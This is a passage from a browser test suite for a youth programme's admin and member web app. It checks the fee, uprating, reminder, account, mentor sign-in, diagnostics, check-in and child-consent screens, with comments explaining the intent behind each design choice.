      /18,000 earned off/.test(fzArr[0]) && /—/.test(fzArr[1]));
    ok('…and flagging the account that has hit the ceiling',
      /at the ceiling/i.test(fzArr[1]) && /reminders off/i.test(fzArr[1]));

    /* Through `step`, for the reason the review desk block now is: an un-caught
       click rejection here would throw past every later block in this file. I
       reintroduced exactly that while writing this and it cost 110 assertions
       before the helper caught it. */
    /* ── The nudge, on the screen ──────────────────────────────────────────
       An overdue review that is only visible once you open the tab where it is
       set is a review nobody performs. So it is announced from the tab bar,
       reachable from wherever you already are. */
    const fzNudge = await fz.evaluate(() => {
      const b = Array.from(document.querySelectorAll('button')).find(x => /review due/i.test(x.textContent || ''));
      return { text: b ? b.textContent.replace(/\s+/g, ' ').trim() : null,
               dot: !!document.querySelector('[data-uprate-due]') };
    });
    ok('an overdue amounts review is announced from the tab bar, not only inside it',
      fzNudge.text !== null && /13 months ago/.test(fzNudge.text) && fzNudge.dot === true);
    if (fzNudge.text !== null && await step('…and the nudge itself opens the Amounts tab',
                                            () => fz.getByRole('button', { name: /review due/i }).click())) {
      await fz.waitForTimeout(250);
      ok('…landing on the tab where the amounts are set',
        /Keeping up with inflation/i.test(await fz.evaluate(() => document.body.innerText)));
    }

    const fzTab = await step('the fees screen has an Amounts tab to open',
                             () => fz.getByRole('button', { name: /^Amounts$/ }).click());
    if (fzTab) {
    await fz.waitForTimeout(250);
    const fzSet = await fz.evaluate(() => document.body.innerText);
    ok('every amount is on the settings tab, 75k among them as a default',
      /Training fee, per session/i.test(fzSet) && /Membership fee/i.test(fzSet) && /Monthly dues/i.test(fzSet));
    /* THE MICROCOPY. Present, and saying the thing. */
    const micro = await fz.evaluate(() => {
      const els = Array.from(document.querySelectorAll('div'))
        .filter(d => /Written off in full once the MOU is accomplished/i.test(d.textContent || '') && d.children.length === 0);
      if (!els.length) return null;
      const el = els[0], cs = getComputedStyle(el);
      /* Compared against the field's EXPLANATORY line, not the uppercase mono
         eyebrow above it — those are different typographic registers, and an
         eyebrow being small does not make a line below it loud. */
      const hint = el.parentElement ? el.parentElement.querySelector('[data-fee-hint]') : null;
      return { text: el.textContent.trim(), size: parseFloat(cs.fontSize),
               weight: String(cs.fontWeight), style: cs.fontStyle, tag: el.tagName,
               hintSize: hint ? parseFloat(getComputedStyle(hint).fontSize) : null };
    });
    ok('the training fee says it is written off once the MOU is accomplished', micro !== null);
    /* PLAYED LOW, checked as rendered rather than by reading the source: not a
       heading, not bold, and no bigger than the label above it. A future edit
       that promotes this line to a selling point fails here. */
    ok('…played low — not a heading, not bold, quieter than the line above it',
      micro !== null && !/^H[1-6]$/.test(micro.tag)
      && parseInt(micro.weight, 10) <= 400
      && micro.hintSize !== null && micro.size < micro.hintSize);
    /* Stating the condition, not promising the outcome. A member who leaves
       early owes it, so "refunded" and "guaranteed" would be false. */
    ok('…stating the condition rather than promising a refund',
      micro !== null && /once the MOU/i.test(micro.text)
      && !/refund/i.test(fzSet) && !/guarantee/i.test(fzSet));
    /* The ceiling is explained where it is set, because "0" silently meaning
       "no limit" is the kind of field somebody zeroes to be tidy. */
    ok('…and the ceiling explains what 0 means before somebody types it',
      /0 means no ceiling/i.test(fzSet));
    ok('…and the reminder floor is stated as a number, not discovered on save',
      /minimum is 7/i.test(fzSet));

    /* ── Uprating: proposed on screen, never silently applied ──────────────
     * The one thing an admin has to believe correctly before pressing this is
     * that it does NOT reach back into balances already charged. If they think
     * it reprices August, they will never use it; if they think it forgives
     * arrears, they will use it for the wrong reason. So the screen says so, and
     * the confirm says so again next to the actual figures.
     */
    ok('the amounts tab proposes an inflation uprate, with the figures',
      /Keeping up with inflation/i.test(fzSet)
      && /5,750/.test(fzSet) && /1,150/.test(fzSet) && /86,250/.test(fzSet));
    ok('…saying plainly that charges already on an account do not move',
      /already on an account stay exactly as they were/i.test(fzSet));
    /* Named because an admin who assumes fines rose with the dues will under-set
       them for a year and never know. */
    ok('…and naming what is NOT included, rather than leaving it to be assumed',
      /Fines are not included/i.test(fzSet) && /Policy/.test(fzSet));
    /* THE DEBT CEILING. Absent from the proposal — it is a protection, not a
       price, and inflating it every year quietly undoes what it is for. */
    const upRows = await fz.evaluate(() => {
      const t = Array.from(document.querySelectorAll('.admin-table'))
        .find(x => /Would become/i.test(x.innerText || ''));
      return t ? Array.from(t.querySelectorAll('tbody tr')).map(r => r.innerText.replace(/\s+/g, ' ')) : null;
    });
    ok('…and the proposal never offers to raise the debt ceiling',
      upRows !== null && upRows.length === 3 && !/ceiling|Stop charging/i.test(upRows.join(' ')));
    /* Stated from the server's bounds rather than a sentence in the component —
       both the list of what moves and the rounding step. */
    ok('…stating what moves and the rounding step, from the server\'s own bounds',
      /membership fee, monthly dues, training fee move/i.test(fzSet)
      && /nearest ₦10/.test(fzSet));
    /* The input cannot offer what the save would clamp: same number, one owner. */
    const fzMax = await fz.evaluate(() => {
      const out = {};
      Array.from(document.querySelectorAll('label')).forEach(l => {
        const t = (l.innerText || '').toLowerCase(), i = l.querySelector('input[type=number]');
        if (!i) return;
        if (t.indexOf('raise amounts by') === 0) out.pct = i.getAttribute('max');
        if (t.indexOf('no more often than every') === 0) out.every = out.every || i.getAttribute('max');
        if (t.indexOf('membership fee') === 0) out.money = i.getAttribute('max');
      });
      return out;
    });
    ok('…and every input carries the server\'s maximum, not one of its own',
      fzMax.pct === '50' && fzMax.money === '10000000' && fzMax.every !== null);

    /* Arriving on the tab has applied nothing. Looking is not doing. */
    ok('…and reading the proposal raises nothing',
      (await fz.evaluate(() => window.__uprateApplies || 0)) === 0
      && (await fz.evaluate(() => window.__upratePreviews || 0)) >= 1);

    if (await step('the uprate offers a button that asks before it raises anything',
                   () => fz.getByRole('button', { name: /^Raise the amounts$/ }).first().click())) {
      await fz.waitForTimeout(300);
      const upDlg = await fz.evaluate(() => {
        const d = document.querySelector('.dialog, [role="dialog"], .modal');
        return d ? d.innerText.replace(/\s+/g, ' ') : null;
      });
      ok('…and the confirm names every figure, old and new',
        upDlg !== null && /15%/.test(upDlg)
        && /₦1,000 → ₦1,150/.test(upDlg) && /₦75,000 → ₦86,250/.test(upDlg));
      ok('…and repeats that balances already charged are untouched',
        upDlg !== null && /not touched/i.test(upDlg) && /12 months/.test(upDlg));
      /* Backing out is a real no. This is the assertion that would have caught a
         confirm wired to fire regardless of the answer. */
      if (await step('…and backing out of the confirm raises nothing',
                     () => fz.getByRole('button', { name: /^Cancel$/ }).click())) {
        await fz.waitForTimeout(250);
        ok('…nothing was raised when the confirm was declined',
          (await fz.evaluate(() => window.__uprateApplies || 0)) === 0);
      }
    }
    }

    /* ── Finding somebody who does not owe ────────────────────────────────
       The arrears list holds debtors, and it was the only door in. So the one
       question a coordinator is asked most — "has Ada paid?" — could not be
       answered for anybody who had. */
    if (await step('the fees screen has a Who owes tab', () => fz.getByRole('button', { name: /Who owes/ }).click())) {
      await fz.waitForTimeout(200);
      if (await step('…with a box to find any account, not only a debtor',
                     () => fz.getByLabel('Find an account').fill('sade'))) {
        await fz.getByRole('button', { name: /^Find$/ }).click();
        await fz.waitForTimeout(300);
        const lk = await fz.evaluate(() => {
          const t = Array.from(document.querySelectorAll('.admin-table'))
            .find(x => /Received/i.test(x.innerText || ''));
          return t ? t.innerText.replace(/\s+/g, ' ') : null;
        });
        /* THE ASSERTION: the member who owes nothing is findable, and is told to
           be square in words rather than as a bare ₦0. */
        ok('…which finds the member who owes nothing, and says so plainly',
          lk !== null && /Sade Squared/.test(lk) && /nothing owed/i.test(lk));
        ok('…while still showing what a debtor owes',
          lk !== null && /Ada Obi/.test(lk) && /₦62,000/.test(lk));
      }
    }

    /* ── Fines and waivers: the entries nothing could post ────────────────── */
    if (await step('an account opens from the arrears list',
                   () => fz.getByRole('button', { name: /Open →/ }).first().click())) {
      await fz.waitForTimeout(300);
      const acts = await fz.evaluate(() => Array.from(document.querySelectorAll('button')).map(b => (b.textContent || '').trim()));
      ok('the account offers a fine, a waiver and an adjustment — all previously unpostable',
        acts.indexOf('Issue a fine') >= 0 && acts.indexOf('Waive') >= 0 && acts.indexOf('Adjust') >= 0);

      if (await step('a fine asks WHY before it can be issued',
                     () => fz.getByRole('button', { name: /^Issue a fine$/ }).click())) {
        await fz.waitForTimeout(250);
        const form = await fz.evaluate(() => {
          const el = document.querySelector('[data-fee-entry="fine"]');
          if (!el) return null;
          const sel = el.querySelector('select');
          return { text: el.innerText.replace(/\s+/g, ' '),
                   reasons: sel ? Array.from(sel.options).map(o => o.textContent.trim()) : [],
                   hasAmount: !!el.querySelector('input[type=number]') };
        });
        /* A vocabulary, not a free-text box: a fine is the charge a family
           disputes, and "late three times in August" is answerable where
           "misconduct" is not. */
        ok('…offering named reasons rather than a blank box',
          form !== null && form.hasAmount && form.reasons.length >= 4
          && form.reasons.join(' | ').indexOf('Late arrival') >= 0);
        ok('…and showing what is outstanding beside the amount, not from memory',
          form !== null && /outstanding/i.test(form.text));
        // Nothing posted by opening the form.
        ok('…and opening it charges nothing',
          (await fz.evaluate(() => (window.__charges || []).length)) === 0);
        if (await step('…and issuing it sends the reason with the amount', async () => {
          await fz.locator('[data-fee-entry="fine"] input[type=number]').fill('500');
          await fz.locator('[data-fee-entry="fine"] textarea').fill('Third time this month');
          await fz.getByRole('button', { name: /^Issue a fine$/ }).last().click();
        })) {
          await fz.waitForTimeout(350);
          const ch = await fz.evaluate(() => (window.__charges || [])[0] || null);
          ok('…so the entry carries an amount, a kind and a reason',
            ch !== null && ch.kind === 'fine' && ch.amount === 500 && !!ch.reason
            && ch.note === 'Third time this month');
        }
      }

      /* The distinction the ledger turns on, said where the choice is made. */
      if (await step('a waiver explains that it is not the same as voiding',
                     () => fz.getByRole('button', { name: /^Waive$/ }).click())) {
        await fz.waitForTimeout(250);
        const wv = await fz.evaluate(() => {
          const el = document.querySelector('[data-fee-entry="waiver"]');
          return el ? el.innerText.replace(/\s+/g, ' ') : null;
        });
        ok('…keeping the charge and recording the decision, in words',
          wv !== null && /keeps the charge/i.test(wv) && /should never have existed/i.test(wv));
        ok('…and asking why, as a required field',
          wv !== null && /required/i.test(wv) && /why it is being waived/i.test(wv));
      }
      /* Escape closes it — the drawer's own key handler, which the fees dialogs
         did not have when they were written against a component that did not
         exist. Also leaves the screen clickable for the block below. */
      await fz.keyboard.press('Escape');
      await fz.waitForTimeout(200);
      await fz.keyboard.press('Escape');
      await fz.waitForTimeout(250);
      ok('…and Escape closes the fee dialogs rather than trapping the screen',
        (await fz.evaluate(() => document.querySelectorAll('.admin-drawer').length)) === 0);
    }

    /* ── Reminders: preview before the un-recallable send ───────────────────
     * Sixty messages to sixty guardians cannot be recalled, so the screen has
     * to answer "who, and how many" BEFORE the button, not after it. And it has
     * to answer "why not" for everybody else, because that is the question a
     * coordinator gets when a family says they were never told.
     */
    if (await step('the fees screen has a Reminders tab',
                   () => fz.getByRole('button', { name: /^Reminders$/ }).click())) {
      await fz.waitForTimeout(250);
      const remIntro = await fz.evaluate(() => document.body.innerText);
      /* The cron ticks every fifteen minutes; the thing a reader reasonably
         fears is being told that IS the cadence. Say what actually decides. */
      ok('the reminders tab says the SPACING decides, not how often the job runs',
        /at most once every/i.test(remIntro) && /14 days/.test(remIntro)
        && /checks far more often/i.test(remIntro));
      /* The distinction the whole ledger turns on, said where somebody about to
         press Send will read it. */
      ok('…and says a training fee being written off is not money owed',
        /payable/i.test(remIntro) && /not money owed/i.test(remIntro));
      /* Nothing has been sent by arriving on the tab — the preview is a
         deliberate, separate action. */
      ok('…and arriving on the tab sends nothing',
        (await fz.evaluate(() => window.__remindRuns || 0)) === 0);

      if (await step('the reminders tab offers a preview before sending',
                     () => fz.getByRole('button', { name: /See who would be reminded/ }).click())) {
        await fz.waitForTimeout(300);
        const remText = await fz.evaluate(() => document.body.innerText);
        ok('…which names how many are due, and who',
          /2 due a reminder now/.test(remText) && /Ada Obi/.test(remText) && /Bode Eze/.test(remText));
        ok('…with what each of them owes, and when they were last reminded',
          /₦62,000/.test(remText) && /never/.test(remText) && /2026-06-01/.test(remText));
        /* WHY NOT, for everyone else — the number that makes the send checkable
           rather than a leap of faith. */
        ok('…and a named reason for every family NOT included',
          /3 nothing payable/.test(remText) && /2 reminded recently/.test(remText)
          && /1 asked not to be reminded/.test(remText) && /1 no guardian email/.test(remText));
        // Still nothing sent: previewing is not sending.
        ok('…and previewing still sends nothing',
          (await fz.evaluate(() => window.__remindRuns || 0)) === 0
          && (await fz.evaluate(() => window.__remindPreviews || 0)) >= 1);
        /* The send button states the number, so the press is not blind. */
        const sendLabel = await fz.evaluate(() => {
          const b = Array.from(document.querySelectorAll('button')).find(x => /^Send \d+$/.test((x.textContent || '').trim()));
          return b ? b.textContent.trim() : null;
        });
        ok('…and the send button carries the count rather than saying "Send"',
          sendLabel === 'Send 2');
      }
    }
    await fz.close();

    /* ── The member's own account ──────────────────────────────────────────
     *
     * We charge members and email their guardian a figure every fortnight, and
     * the member could see none of it. The card that closes that has one job
     * beyond the figure: this is a young person reading a debt on their own
     * screen, so the tone is the design. It leads with what their service has
     * earned off, says nothing in alarm colours, and sets no deadline.
     */
    const acp = await browser.newPage({ viewport: { width: 420, height: 1200 } });
    const acErrs = [];
    acp.on('pageerror', e => acErrs.push(e.message));
    await acp.goto(BASE + '/tests/_boards_fixture.html?board=account&mode=ok&css=1', { waitUntil: 'networkidle' });
    await acp.waitForTimeout(500);
    ok('the member account card mounts with no script error', acErrs.length === 0);
    if (acErrs.length) console.error('       ', acErrs.slice(0, 2).join(' | '));
    const acText = await acp.evaluate(() => document.body.innerText.replace(/\s+/g, ' '));
    /* REAL money only, and called what it is. The training fee is the cost of a
       place given free; when the two shared one figure the reminder cron emailed
       guardians "the balance outstanding is ₦225,000" about a programme their
       child attends for nothing. */
    ok('…showing what there is to pay, as a figure and in plain words',
      /₦4,500/.test(acText) && /to pay/i.test(acText));
    ok('…and NEVER presenting the cost of the free place as money owed',
      !/₦77,500/.test(acText) && !/outstanding/i.test(acText));
    /* The cost is still shown — a member should know what their place is worth —
       but as a fact about what the programme spends, next to a plain statement
       that nobody is asking them for it. */
    ok('…stating the cost of the training place, and that it is covered',
      /₦75,000/.test(acText) && /Cost of your training/i.test(acText)
      && /Covered by NGG/i.test(acText) && /not something you are asked to pay/i.test(acText));
    /* THE LINE THAT MATTERS. Their service earning the cost off is the most
       encouraging number in the subsystem and the one they could not see. */
    ok('…and what their service has already earned off',
      /₦18,000/.test(acText) && /earned off by your service/i.test(acText));
    ok('…and where they are in the three years',
      /MONTH 22 OF 36/.test(acText) && /SERVICE/.test(acText) && /4\/18 SERVED/.test(acText));
    /* No deadline, no consequence, nobody threatened — and a person to talk to.
       A panel that alarms produces a member who stops opening the dashboard. */
    ok('…with no threat, no deadline, and a person to speak to',
      !/(overdue|immediately|must pay|penalt|suspend|deadline|failure to)/i.test(acText)
      && /centre coordinator/i.test(acText));
    /* Not red. Checked as rendered, because "we would never colour it red" is
       exactly the kind of intention a later edit loses. */
    const acColour = await acp.evaluate(() => {
      const el = document.querySelector('.dash-account-figure');
      if (!el) return null;
      const c = getComputedStyle(el).color.match(/\d+/g).map(Number);
      return { r: c[0], g: c[1], b: c[2] };
    });
    ok('…and the figure is not rendered in an alarm colour',
      acColour !== null && !(acColour.r > 150 && acColour.r > acColour.g * 1.6 && acColour.r > acColour.b * 1.6));
    // The detail is there when asked for, and folded away until then.
    const acBefore = await acp.evaluate(() => document.querySelectorAll('.dash-account-row').length);
    if (await step('the account folds its history away until asked',
                   () => acp.getByRole('button', { name: /See every entry/ }).click())) {
      await acp.waitForTimeout(250);
      const rows = await acp.evaluate(() => Array.from(document.querySelectorAll('.dash-account-row')).map(r => r.innerText.replace(/\s+/g, ' ')));
      ok('…then listing every entry in the member\'s own words',
        acBefore === 0 && rows.length === 4
        && /You paid/.test(rows.join(' ')) && /Monthly dues/.test(rows.join(' '))
        && /Fine/.test(rows.join(' ')));
      /* And the training row is labelled as covered even inside the list. A row
         reading "Training fee ₦75,000" among things a family owes reads as a
         bill however carefully the panel above is worded. */
      ok('…with the training row named as covered, not as a charge',
        /covered by NGG/i.test(rows.join(' ')));
      /* Their record, not our operational one: no staff id, no bank reference,
         no entry id. The server withholds them; this proves the screen cannot
         leak them either. */
      ok('…and never a staff name, a bank reference or an entry id',
        !/NGG-2025|FEE-[0-9A-F]{6}|TRF-/.test(rows.join(' ')));
    }
    await acp.close();

    /* ── The Mentor Portal's door ──────────────────────────────────────────
     * Reported from the field: "I'm unable to login to the mentorship page.
     * It does not recognize summer volunteers as members." Exactly right —
     * the sign-in modal is email-and-password only, and an instructor or a
     * summer volunteer has no account and no password, only an ID card. The
     * backend accepted them; there was no door. */
    const dT = await browser.newContext({ viewport: { width: 390, height: 900 }, hasTouch: true });
    const dP = await dT.newPage();
    await dP.addInitScript(() => {
      const soft = (o) => new Proxy(o, { get: (t, k) => (k in t) ? t[k] : (typeof k === 'string' ? () => Promise.resolve({}) : undefined) });
      const nope = () => Promise.reject(Object.assign(new Error('unauthorized'), { code: 'unauthorized' }));
      const stub = { auth: { me: nope, studentLogin: () => Promise.resolve({ member: {}, kind: 'volunteer' }) },
                     member: soft({ mentorRoster: nope }) };
      const root = new Proxy(stub, { get: (t, k) => (k in t) ? t[k] : soft({}) });
      Object.defineProperty(window, 'NGGApi', { get: () => root, set: () => {}, configurable: false });
    });
    fs.writeFileSync(path.join(ROOT, 'tests', '_door_fixture.html'),
      '<!doctype html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">'
      + '<link rel="stylesheet" href="/dist/styles.css"><link rel="stylesheet" href="/dist/styles-app.css"></head>'
      + '<body><div id="root"></div>'
      + '<script src="/dist/vendor/react.production.min.js"></script>'
      + '<script src="/dist/vendor/react-dom.production.min.js"></script>'
      + '<script src="/dist/data.js"></script><script src="/dist/photos.js"></script>'
      + '<script src="/dist/app.min.js"></script></body></html>');
    await dP.goto(BASE + '/tests/_door_fixture.html', { waitUntil: 'networkidle' });
    await dP.waitForFunction(() => typeof window.__navigate === 'function', null, { timeout: 15000 });
    await dP.evaluate(() => window.__navigate('mentor'));
    await dP.waitForTimeout(1100);
    const doorText = await dP.evaluate(() => document.body.innerText);
    ok('the signed-out portal offers the email door', /Sign in with email/i.test(doorText));
    /* The half that was missing. Without it a summer volunteer standing at
       /mentor has no way in at all — the modal wants a password they do not
       have. */
    ok('…and the ID-card door beside it', /SIGN IN WITH YOUR ID CARD/i.test(doorText)
       && await dP.getByPlaceholder(/Card ID/i).count() === 1);
    // One door needs no chooser; offering "I'm a student" here invites failure.
    ok('…with no student option on a staff-only door', !/I'm a student/i.test(doorText));
    /* The door always sent everyone to /community, so a mentor who did find it
       was carried away from the portal they were trying to open. Checked by
       following the redirect, not by reading the markup — the destination is
       the whole point and it is invisible until the button is pressed. */
    await dP.fill('input[aria-label="Card ID"]', 'VOL-INS-26-001');
    await dP.fill('input[aria-label="Your phone number"]', '08037654321');
    await dP.getByRole('button', { name: /Enter/ }).click();
    // The destination is a 404 on this harness, so the page never fires
    // 'load' and waitForURL times out even once the address has changed.
    // Read the address itself.
    let landed = '';
    for (let i = 0; i < 25 && landed !== '/mentor'; i++) {
      landed = new URL(dP.url()).pathname;
      if (landed !== '/mentor') await dP.waitForTimeout(200);
    }
    ok('…which returns to the portal rather than the community (' + landed + ')', landed === '/mentor');
    await dP.close(); await dT.close();
    try { fs.unlinkSync(path.join(ROOT, 'tests', '_door_fixture.html')); } catch (_) {}

    /* ── Diagnostics ───────────────────────────────────────────────────────
     * The screen a coordinator opens when something feels wrong. Two things
     * it must not do: signal state by colour alone, and look broken when
     * nothing has broken. */
    fs.writeFileSync(path.join(ROOT, 'tests', '_ops_fixture.html'),
      '<!doctype html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">'
      + '<link rel="stylesheet" href="/dist/styles.css"><link rel="stylesheet" href="/dist/styles-app.css"></head>'
      + '<body class="app-shell app-shell-admin"><div id="x"></div>'
      + '<script src="/dist/vendor/react.production.min.js"></script>'
      + '<script src="/dist/vendor/react-dom.production.min.js"></script>'
      + '<script src="/dist/data.js"></script><script src="/dist/photos.js"></script>'
      + '<script src="/dist/app.min.js"></script>'
      + '<script>ReactDOM.createRoot(document.getElementById("x"))'
      + '.render(React.createElement(window.AdminOps));</script></body></html>');
    const opsPage = async (payload) => {
      const pg = await browser.newPage();
      await pg.addInitScript((pl) => {
        const stub = { admin: { ops: { status: () => Promise.resolve(pl), clear: () => Promise.resolve({ cleared: 1 }) } } };
        Object.defineProperty(window, 'NGGApi', { get: () => stub, set: () => {}, configurable: false });
      }, payload);
      await pg.goto(BASE + '/tests/_ops_fixture.html', { waitUntil: 'networkidle' });
      await pg.waitForTimeout(900);
      return pg;
    };
    const busted = await opsPage({ schemaTarget: 67, build: 'abc123', errors24h: 53, clearedCount: 2,
      health: { ok: false, serving: true, schema: 67,
        checks: { db: { ok: true, mode: 'rw' }, schema: { ok: true, at: 67 }, cron: { ok: false, stale: ['reminders'] } },
        cron: { deliver: { interval: 60, ageSeconds: 12 }, reminders: { interval: 900, ageSeconds: 41000 }, maint: { interval: 3600, ageSeconds: null } } },
      events: [{ id: 1, kind: 'error', source: 'admin.summer.attendance', message: 'no such table: v3_scores',
                 detail: 'summer.php:812', hits: 53, firstAt: '2026-07-28T06:10:00Z', lastAt: '2026-07-28T09:44:00Z' }] });
    const bText = await busted.evaluate(() => document.getElementById('x').innerText);
    ok('the diagnostics screen names the failing endpoint and how often', /admin\.summer\.attendance/.test(bText) && /53×/.test(bText));
    ok('…and says which background job has stalled', /stalled: reminders/.test(bText) && /11h ago/i.test(bText));
    /* A red dot and a green dot are the same dot to about one man in twelve,
       and this is the screen you read in a hurry. */
    ok('…marking state with a glyph, not colour alone', /✕/.test(bText) && /✓/.test(bText));
    await busted.close();

    const clean = await opsPage({ schemaTarget: 67, build: 'abc123', errors24h: 0, clearedCount: 0,
      health: { ok: true, serving: true, schema: 67, checks: { db: { ok: true }, schema: { ok: true, at: 67 }, cron: { ok: true } },
        cron: { deliver: { interval: 60, ageSeconds: 5 } } },
      events: [] });
    const cText = await clean.evaluate(() => document.getElementById('x').innerText);
    /* An empty table on a diagnostics screen reads as "this is broken too".
       Say plainly that empty is the good answer. */
    ok('an empty journal reads as good news, not as a broken screen',
       /that is the expected state/i.test(cText) && !/✕/.test(cText));
    await clean.close();
    try { fs.unlinkSync(path.join(ROOT, 'tests', '_ops_fixture.html')); } catch (_) {}

    /* ── The check-in desk's scanned state ─────────────────────────────────
     * Used at arm's length, in a noisy hall, by someone also talking to a
     * child. The old confirmation was an eleven-pixel row prepended to a list
     * of identical rows — present, but indistinguishable from the scan before
     * it, so an operator could not tell a check-in from a repeat or a refusal
     * without stopping to read. */
    const chk1 = await browser.newPage();
    const chkErrs = [];
    chk1.on('pageerror', e => chkErrs.push(String(e.message)));
    await chk1.goto(BASE + '/tests/_boards_fixture.html?board=checkin&mode=ok&css=1', { waitUntil: 'networkidle' });
    await chk1.waitForSelector('button', { timeout: 15000 });
    ok('the check-in desk mounts with no script error', chkErrs.length === 0);
    if (chkErrs.length) console.error('       ', chkErrs.slice(0, 3).join(' | '));

    // Type a code rather than driving the camera — same code path into mark().
    const scanAs = async (token) => {
      await chk1.evaluate(() => {
        const b = Array.from(document.querySelectorAll('button')).find(x => /Enter the code/i.test(x.textContent));
        if (b) b.click();
      });
      await chk1.waitForSelector('input[placeholder*="Code from the ID"]', { timeout: 5000 });
      await chk1.evaluate((t) => {
        const i = document.querySelector('input[placeholder*="Code from the ID"]');
        const set = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        set.call(i, t); i.dispatchEvent(new Event('input', { bubbles: true }));
        i.closest('form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
      }, token);
      await chk1.waitForTimeout(450);
    };
    const panel = () => chk1.evaluate(() => {
      const el = document.querySelector('[role="status"][aria-live="assertive"]');
      if (!el) return null;
      const r = el.getBoundingClientRect();
      return { text: el.innerText.replace(/\n/g, ' | '), h: Math.round(r.height),
               border: getComputedStyle(el).borderColor, photo: !!el.querySelector('img') };
    });

    await scanAs('OKTOKEN');
    let pn = await panel();
    ok('a successful scan puts a result panel on screen at all', pn !== null);
    ok('…naming the person, not just a tick (' + (pn && pn.text.slice(0, 48)) + ')',
       pn && /Adaeze Okonkwo/.test(pn.text) && /Checked in/i.test(pn.text));
    /* The old row was ~40px of an identical-looking list. Height is a crude
       proxy for "you cannot miss this", but it is the property that failed. */
    ok('…at a size that reads across a desk (' + (pn && pn.h) + 'px tall)', pn && pn.h >= 90);
    ok('…and shows their photo, so the card can be matched to the face', pn && pn.photo === true);
    ok('…and the desk vibrated', (await chk1.evaluate(() => window.__vibes.length)) > 0);

    const okBorder = pn.border;
    await scanAs('AGAINTOKEN');
    pn = await panel();
    ok('a repeat scan says so rather than looking like a fresh check-in',
       pn && /Already in/i.test(pn.text) && !/^.*Checked in.*$/i.test(pn.text.split('|')[1] || ''));
    /* Colour alone is never the signal — the glyph and the word change too, so
       this holds up for an operator who cannot distinguish green from amber. */
    ok('…distinguished by more than colour', pn && pn.border !== okBorder && /↻/.test(pn.text));

    await scanAs('BADCODE');
    pn = await panel();
    ok('a refused scan is announced, not left to a small red line',
       pn && /Not accepted/i.test(pn.text) && /isn.t assigned/i.test(pn.text));
    ok('…and marked with its own glyph', pn && /✕/.test(pn.text));

    /* The one an operator must never miss: the person must not be admitted. */
    await scanAs('SUSPENDED');
    pn = await panel();
    ok('a policy refusal spells out that they must not be admitted',
       pn && /Do NOT admit/i.test(pn.text));

    // Late arrivals carry the detail an operator has to act on.
    await scanAs('LATETOKEN');
    pn = await panel();
    ok('a late check-in says how late, on the panel itself', pn && /Late by 22 min/i.test(pn.text));

    /* Sound is optional — a desk in a quiet room turns it off — but the panel
       and the vibration are not, so the outcome is never silent AND invisible. */
    const vibesBefore = await chk1.evaluate(() => window.__vibes.length);
    await chk1.evaluate(() => {
      const b = Array.from(document.querySelectorAll('button')).find(x => /Scan sound/i.test(x.textContent));
      if (b) b.click();
    });
    await chk1.waitForTimeout(150);
    ok('the desk can be muted', /off/i.test(await chk1.evaluate(() => {
      const b = Array.from(document.querySelectorAll('button')).find(x => /Scan sound/i.test(x.textContent));
      return b ? b.textContent : '';
    })));
    await scanAs('OKTOKEN');
    ok('…and a muted desk still shows the panel and still vibrates',
       (await panel()) !== null && (await chk1.evaluate(() => window.__vibes.length)) > vibesBefore);
    ok('…with the choice remembered for next time',
       (await chk1.evaluate(() => localStorage.getItem('ngg.gate.mute'))) === '1');

    // It must clear itself, or the next child is greeted by the last one's name.
    await chk1.waitForTimeout(4200);
    ok('the panel clears itself so it cannot be mistaken for the next scan',
       (await panel()) === null);
    await chk1.close();

    /* ── Recording publication consent for a child ─────────────────────────
     * The payload is the whole point. A wrong type or a missing method records
     * the wrong permission for a real child and looks identical on screen. */
    const con = await browser.newPage();
    const conErrs = [];
    con.on('pageerror', e => conErrs.push(String(e.message)));
    await con.goto(BASE + '/tests/_boards_fixture.html?board=consent&mode=ok', { waitUntil: 'networkidle' });
    await con.waitForSelector('.admin-select', { timeout: 15000 });
    const conTxt0 = await con.evaluate(() => document.body.innerText);
    ok('the consent editor mounts with no script error', conErrs.length === 0);
    if (conErrs.length) console.error('       ', conErrs.slice(0, 3).join(' | '));
    ok('…offering both grants the public surfaces actually read',
       /Feature on our website/.test(conTxt0) && /Photos & media/.test(conTxt0));
    /* "Not recorded" and "Declined" must not read the same. Nobody has been
       asked yet — that is a task outstanding, not a decision made. */
    ok('…showing an unrecorded child as unrecorded, not as declined',
       /Not recorded/.test(conTxt0) && !/Declined ·/.test(conTxt0));
    ok('…and naming the handle they appear under meanwhile', /ngg0777/.test(conTxt0));
    ok('…with both grants addressable as their own rows',
       await con.evaluate(() => !!document.querySelector('[data-consent-row="site_visibility"]')
                             && !!document.querySelector('[data-consent-row="media"]')));

    // Record a grant with a non-default method, so the method in the payload
    // can only have come from the control.
    await con.evaluate(() => {
      const sel = document.querySelector('.admin-select');
      sel.value = 'By phone';
      sel.dispatchEvent(new Event('change', { bubbles: true }));
    });
    const conClick = (type, label) => con.evaluate(([t, l]) => {
      const row = document.querySelector('[data-consent-row="' + t + '"]');
      Array.from(row.querySelectorAll('button')).find(b => b.textContent.trim() === l).click();
    }, [type, label]);
    await conClick('site_visibility', 'Granted');
    await con.waitForFunction(() => (window.__consent || []).length > 0, null, { timeout: 8000 });
    const sentCon = await con.evaluate(() => window.__consent);
    ok('granting sends exactly one record (' + sentCon.length + ')', sentCon.length === 1);
    ok('…for the right child, the right consent type, and the chosen method ('
       + JSON.stringify(sentCon[0]) + ')',
       sentCon[0].memberId === 'NGG-2025-0777' && sentCon[0].type === 'site_visibility'
       && sentCon[0].status === 'granted' && sentCon[0].method === 'By phone');
    const conTxt1 = await con.evaluate(() => document.body.innerText);
    ok('…and the row updates to show what was recorded and by whom',
       /Granted · By phone/.test(conTxt1) && /Admin User/.test(conTxt1));

    // Declining is a first-class answer, not just "leave it blank".
    await conClick('media', 'Declined');
    await con.waitForFunction(() => (window.__consent || []).length > 1, null, { timeout: 8000 });
    const sentCon2 = await con.evaluate(() => window.__consent);
    ok('declining the photo grant is recorded as its own decision',
       sentCon2.length === 2 && sentCon2[1].type === 'media' && sentCon2[1].status === 'declined');
    await con.close();

    // A decision recorded earlier has to be visible, or staff re-ask a
    // guardian who already answered.
    const con2 = await browser.newPage();
    await con2.goto(BASE + '/tests/_boards_fixture.html?board=consent&mode=ok&seeded=1', { waitUntil: 'networkidle' });
    await con2.waitForSelector('.admin-select', { timeout: 15000 });
    const seededTxt = await con2.evaluate(() => document.body.innerText);
    await con2.close();
    ok('an existing decision shows its method, who recorded it and when',
